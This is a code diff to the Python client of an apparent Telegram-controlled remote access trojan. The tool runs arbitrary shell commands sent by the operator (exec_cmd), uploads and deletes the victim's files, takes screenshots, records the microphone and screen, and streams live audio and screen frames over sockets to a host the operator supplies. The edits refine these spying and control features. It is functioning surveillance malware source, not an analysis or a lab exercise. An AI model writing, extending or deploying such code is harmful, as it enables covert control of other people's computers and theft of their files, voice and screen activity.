@@ -1,4 +1,3 @@
-import subprocess
 import pyautogui
 import pyaudio
 import socket
@@ -10,6 +9,8 @@ import cv2
 import os
 
 import numpy as np
+
+from subprocess import Popen, PIPE
 
 from telebot.types import KeyboardButton, ReplyKeyboardMarkup, ReplyKeyboardRemove
 from threading import Thread
@@ -47,8 +48,11 @@ class Client:
         self.CHANNELS = 1
         self.CHUNK = 8192
         
+        
         self.filename_audio = "recorded_audio.wav"
-        self.filename_video = "video1.avi"
+        self.filename_dump_audio = "dump_record_microphone.wav"
+        self.filename_for_dump_audio = "dump_record_microphone.dat"
+        self.filename_video = "recorded_video.avi"
 
     def create_markup(self):
         markup = ReplyKeyboardMarkup()
@@ -57,7 +61,7 @@ class Client:
         if len(list_files) >= 230:
             [markup.add(i) for i in list_files[0:228]]
         else:
-            [markup.add(i) for i in list_files]
+            [markup.add(i) for i in list_files[0:228]]
         markup.add("EXIT")
         return markup
 
@@ -98,7 +102,7 @@ class Client:
                 else:
                     bot.send_message(ms.chat.id, "<Empty>", reply_markup=markup)
             except Exception as e:
-                bot.send_message(ms.chat.id, f"Error:\n{e}")
+                bot.send_message(ms.chat.id, f"Error:\n{e}", reply_markup=markup)
 
         elif ms.text == "rm_file":
             markup_rm = self.create_markup()
@@ -126,14 +130,15 @@ class Client:
             def exec_cmd_next(ms):
                 if ms.text != "EXIT":
                     try:
-                        output = subprocess.run(ms.text, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-                        output = output.stdout + output.stderr
-                        if output:
-                            bot.send_message(ms.chat.id, output, reply_markup=markup)
+                        output = Popen(ms.text.split(" "), stdout=PIPE, stderr=PIPE, shell=True)
+                        result, err = output.communicate()
+                        
+                        if result:
+                            bot.send_message(ms.chat.id, result, reply_markup=markup)
                         else:
                             bot.send_message(ms.chat.id, "<Empty>", reply_markup=markup)
                     except Exception as e:
-                        bot.send_message(ms.chat.id, f"Error:\n{e}")
+                        bot.send_message(ms.chat.id, f"Error:\n{e}", reply_markup=markup)
                 else:
                     bot.send_message(ms.chat.id, "EXIT", reply_markup=markup)
 
@@ -149,7 +154,7 @@ class Client:
                     try:
                         bot.send_document(ms.chat.id, open(ms.text, "rb"), reply_markup=markup)
                     except Exception as e:
-                        bot.send_message(ms.chat.id, f"Error:\n{e}")
+                        bot.send_message(ms.chat.id, f"Error:\n{e}", reply_markup=markup)
                 else:
                     bot.send_message(ms.chat.id, "EXIT", reply_markup=markup)
 
@@ -160,14 +165,17 @@ class Client:
             myScreenshot = pyautogui.screenshot()
             myScreenshot.save("screenshot.jpg")
             
-            with open("screenshot.jpg", "rb") as photo:
-                bot.send_photo(ms.chat.id, photo)
-            
-            time.sleep(1)
-            os.remove("sreenshot.jpg")
+            try:
+                with open("screenshot.jpg", "rb") as photo:
+                    bot.send_photo(ms.chat.id, photo)
+                
+                time.sleep(1)
+                os.remove("sreenshot.jpg")
+            except Exception as e:
+                bot.send_message(ms.chat.id, f"Error:\n{e}", reply_markup=markup)
 
 
-        elif ms.text == "record_audio":
+        elif ms.text == "record_microphone":
             markup_record_audio = ReplyKeyboardMarkup()
             markup_record_audio.add("EXIT")
             bot.send_message(ms.chat.id, "Enter time, quantity iteration...", reply_markup=markup_record_audio)
@@ -180,24 +188,24 @@ class Client:
                         time = int(list_data[0])
                         quantity = int(list_data[1])
 
-                        bot.send_message(ms.chat.id, "Recording 🎲")
+                        bot.send_message(ms.chat.id, "Recording 🎲", reply_markup=markup)
 
                         for i in range(quantity):
-                            self.recordAUDIO(time)
+                            self.record_microphone(time)
                             with open(self.filename_audio, 'rb') as audio:
                                 bot.send_audio(ms.chat.id, audio)
 
                         os.remove(self.filename_audio)
                         bot.send_message(ms.chat.id, "Finished recording ✅", reply_markup=markup)
                     except Exception as e:
-                        bot.send_message(ms.chat.id, f"Error:\n{e}")
+                        bot.send_message(ms.chat.id, f"Error:\n{e}", reply_markup=markup)
                 else:
                     bot.send_message(ms.chat.id, "EXIT", reply_markup=markup)
 
             bot.register_next_step_handler(ms, record_audio_next)
 
         elif ms.text == "get_audio":
-            with open("dump_record_audio.dat", "rb") as dump_in:
+            with open(self.filename_for_dump_audio, "rb") as dump_in:
                 unpickler = pickle.Unpickler(dump_in)
                 frame = unpickler.load()
 
@@ -209,7 +217,7 @@ class Client:
                                 output=True,
                                 frames_per_buffer=self.CHUNK)
 
-                wf = wave.open(self.filename_audio, "wb")
+                wf = wave.open(self.filename_dump_audio, "wb")
                 wf.setnchannels(self.CHANNELS)
                 wf.setsampwidth(p.get_sample_size(self.FORMAT))
                 wf.setframerate(self.RATE)
@@ -218,30 +226,28 @@ class Client:
 
             bot.send_message(ms.chat.id, "Unpacked ✅", reply_markup=markup)
 
-            with open(self.filename_audio, "rb") as audio:
+            with open(self.filename_dump_audio, "rb") as audio:
                 bot.send_audio(ms.chat.id, audio)
 
-            os.remove(self.filename_audio)
-            os.remove("dump_record_audio.dat")
+            os.remove(self.filename_for_dump_audio)
+            os.remove(self.filename_dump_audio)
 
 
         elif ms.text == "record_video":
             bot.send_message(ms.chat.id, "Recording 🎲", reply_markup=markup)
 
             while True:
-                break_time = round(time.time()) + 70
                 video = cv2.VideoWriter(filename=self.filename_video, fourcc=self.FOURCC, fps=15.0, frameSize=(self.SCREEN_SIZE))
-                
-                while os.path.exists(self.filename_video):
-                    index = self.filename_video[5:-4]
-                    self.filename_video = self.filename_video[:-5] + str(int(index) + 1) + ".avi"
-
                 while True:
-                    if round(time.time()) == break_time:
+                    if os.stat(self.filename_video).st_size >= 20185088:
                         cv2.destroyAllWindows()
                         video.release()
-                        break
+                        with open(self.filename_video, "rb") as video:
+                            bot.send_video(ms.chat.id, video)
 
+                        os.remove(self.filename_video)
+                        break
+                    
                     frame = pyautogui.screenshot()
                     frame = np.array(frame)
 
@@ -256,10 +262,12 @@ class Client:
             def get_video_next(ms):
                 if ms.text != "EXIT":
                     try:
-                        bot.send_video(ms.chat.id, open(ms.text, "rb"), reply_markup=markup)
+                        bot.send_message(ms.chat.id, "Sending a video 🎲", reply_markup=markup)
+                        with open(ms.text, "rb") as video:
+                            bot.send_video(ms.chat.id, video)
                         os.remove(ms.text)
                     except Exception as e:
-                        bot.send_message(ms.chat.id, f"Error:\n{e}")
+                        bot.send_message(ms.chat.id, f"Error:\n{e}", reply_markup=markup)
                 else:
                     bot.send_message(ms.chat.id, "EXIT", reply_markup=markup)
 
@@ -278,13 +286,10 @@ class Client:
                         list_data = ms.text.split()
                         PORT = int(list_data[0])
                         HOST = list_data[1]
-                        
-                        self.running_micro = True
-                        thr = Thread(target=self.get_micro, args=(HOST, ms)).start()
+
+                        Thread(target=self.listening_microphone, args=(HOST, ms)).start()
 
                         server_socket_s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                        __running = True
-
                         try:
                             bot.send_message(ms.chat.id, "Connection attempt 🎲")
                             server_socket_s.connect((HOST, PORT))
@@ -293,6 +298,8 @@ class Client:
                             return
 
                         bot.send_message(ms.chat.id, "Successful connection ✅", reply_markup=markup)
+                        
+                        __running = True
                         while __running:
                             screen = pyautogui.screenshot()
                             frame = np.array(screen)
@@ -313,7 +320,7 @@ class Client:
 
             bot.register_next_step_handler(ms, getscreen_next)
 
-    def recordAUDIO(self, time=6):
+    def record_microphone(self, time=6):
         p = pyaudio.PyAudio()
         stream = p.open(format=self.FORMAT,
                         channels=self.CHANNELS,
@@ -327,8 +334,8 @@ class Client:
             data = stream.read(self.CHUNK)
             frames.append(data)
 
-            with open('dump_record_audio.dat', 'wb') as dump_out:
-                pickle.dump(frames, dump_out, protocol=3)
+            with open(self.filename_for_dump_audio, 'wb') as dump_rm:
+                pickle.dump(frames, dump_rm, protocol=3)
 
         stream.stop_stream()
         stream.close()
@@ -341,8 +348,9 @@ class Client:
         wf.writeframes(b"".join(frames))
         wf.close()
 
-    def get_micro(self, HOST, ms):
+    def listening_microphone(self, HOST, ms):
         PORT = 9999
+        __running = True
 
         p = pyaudio.PyAudio()
         stream = p.open(format=self.FORMAT,
@@ -359,19 +367,21 @@ class Client:
             bot.send_message(ms.chat.id, f"Error ❌\n{e}", reply_markup=markup)
             return
 
-        while self.running_micro:
+        while __running:
             try:
                 server_socket_m.sendall(stream.read(self.CHUNK))
             except IOError:
-                self.running_micro = False
+                __running = False
             except:
-                self.running_micro = False
+                __running = False
 
         stream.stop_stream()
         stream.close()
         server_socket_m.close()
         server_socket_m.close()
         p.terminate()
+
+
 
 
 """ Variables """
@@ -385,7 +395,7 @@ markup = ReplyKeyboardMarkup(True, True)
 markup.add(KeyboardButton("cd"), KeyboardButton("chdir"),
         KeyboardButton("dir"), KeyboardButton("rm_file"),
         KeyboardButton("exec_cmd"), KeyboardButton("get_file"), 
-        KeyboardButton("record_audio"), KeyboardButton("get_audio"),
+        KeyboardButton("record_microphone"), KeyboardButton("get_audio"),
         KeyboardButton("record_video"), KeyboardButton("get_video"),
         KeyboardButton("get_screen"), KeyboardButton("screenshot"))
  
